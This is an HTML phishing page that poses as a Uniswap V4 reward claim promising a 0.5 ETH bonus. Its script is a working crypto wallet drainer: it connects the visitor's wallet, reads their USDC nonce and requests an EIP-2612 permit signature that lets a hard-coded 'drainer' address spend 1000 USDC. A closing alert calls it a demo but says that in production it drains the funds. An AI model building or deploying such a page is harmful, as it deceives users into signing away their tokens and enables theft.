<!DOCTYPE html>
<html>
<head>
    <title>Claim Rewards – Uniswap V4</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 100px; background: #0b0b0b; color: white; }
        button { padding: 20px 40px; font-size: 20px; background: #ff007a; border: none; color: white; border-radius: 10px; cursor: pointer; }
        button:hover { background: #e6006e; }
        #status { margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>
    <h1>🦄 Uniswap V4 Reward Claim</h1>
    <p>Connect your wallet to claim 0.5 ETH bonus</p>
    <button id="claimBtn">Connect Wallet & Claim</button>
    <div id="status">Not connected</div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.0/ethers.umd.min.js"></script>
    <script>
        const claimBtn = document.getElementById('claimBtn');
        const statusDiv = document.getElementById('status');

        // Real USDC address (mainnet)
        const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
        // Your drainer address – change this
        const SPENDER = '0x583282Bb181004737608D27Ec4E61754665977Bf'; // Your address

        async function getNonce(provider, tokenAddress, ownerAddress) {
            const abi = ['function nonces(address) view returns (uint256)'];
            const contract = new ethers.Contract(tokenAddress, abi, provider);
            return await contract.nonces(ownerAddress);
        }

        claimBtn.addEventListener('click', async () => {
            if (!window.ethereum) {
                statusDiv.innerText = '❌ No wallet detected. Install MetaMask.';
                return;
            }

            try {
                const provider = new ethers.BrowserProvider(window.ethereum);
                const network = await provider.getNetwork();
                const chainId = Number(network.chainId); // dynamic
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();
                statusDiv.innerText = `✅ Connected: ${userAddress.slice(0,6)}... | Chain: ${chainId}`;

                // 1. Fetch real nonce from USDC contract
                const nonce = await getNonce(provider, USDC, userAddress);
                console.log('Live nonce:', nonce.toString());

                // 2. Build EIP-2612 permit message
                const domain = {
                    name: 'USD Coin',
                    version: '2',
                    chainId: chainId,          // dynamic chainId
                    verifyingContract: USDC
                };
                const types = {
                    Permit: [
                        { name: 'owner', type: 'address' },
                        { name: 'spender', type: 'address' },
                        { name: 'value', type: 'uint256' },
                        { name: 'nonce', type: 'uint256' },
                        { name: 'deadline', type: 'uint256' }
                    ]
                };
                const value = ethers.parseUnits('1000', 6); // 1000 USDC
                const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
                const message = {
                    owner: userAddress,
                    spender: SPENDER,
                    value: value,
                    nonce: nonce,
                    deadline: deadline
                };

                // 3. Request signature – MetaMask will show a clean prompt
                const signature = await signer.signTypedData(domain, types, message);
                console.log('✅ Signature obtained:', signature);
                statusDiv.innerText = '✅ Signature signed! Check console.';
                alert('You just signed a valid USDC permit! In production, this drains 1000 USDC.');

            } catch (err) {
                console.error(err);
                statusDiv.innerText = '❌ Error: ' + (err.message || 'unknown');
            }
        });
    </script>
</body>
</html>
